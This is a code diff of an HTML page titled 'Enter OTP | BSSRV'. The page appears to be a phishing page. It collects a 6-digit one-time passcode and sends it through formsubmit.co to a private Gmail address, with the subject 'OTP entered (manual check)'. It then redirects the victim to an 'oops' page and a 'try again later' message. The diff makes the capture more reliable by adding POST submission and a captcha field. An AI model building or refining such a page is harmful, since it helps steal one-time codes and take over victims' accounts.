@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Enter OTP | BSSRV</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="assets/css/style.css">
 </head>
 <body>
 
@@ -22,11 +22,12 @@
       <h2>Enter OTP</h2>
       <p>Please enter the 6-digit OTP sent to your Gmail.</p>
 
-      <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" >
+      <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
         <!-- Hidden field to hold combined OTP -->
         <input type="hidden" name="otp" id="fullOtp">
         <input type="hidden" name="_subject" value="OTP entered (manual check)">
         <input type="hidden" name="_next" value="oops.html">
+        <input type="hidden" name="_captcha" value="true">
 
         <div class="otp-container">
           <input type="text" maxlength="1" class="otp-box" required>
@@ -42,7 +43,7 @@
         </div>
       </form>
 
-      <p id="status" class="status"></p>
+      <p id="status" class="status" style="color:green;"></p>
       <p class="note">Didn't receive OTP? Try again later.</p>
     </div>
   </section>
@@ -52,7 +53,7 @@
     const otpBoxes = document.querySelectorAll('.otp-box');
     const fullOtp = document.getElementById('fullOtp');
 
-    // Combine OTP and submit
+    // Combine OTP and update hidden field
     form.addEventListener('submit', (e) => {
       const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
       fullOtp.value = otpValue;
@@ -60,7 +61,7 @@
       // Form will submit normally; redirect handled by _next
     });
 
-    // Optional: auto-focus next box
+    // Auto-focus next box when typing
     otpBoxes.forEach((box, i) => {
       box.addEventListener('input', () => {
         if (box.value.length === 1 && i < otpBoxes.length - 1) {
@@ -72,6 +73,8 @@
 
 </body>
 </html>
+
+
 
 
 
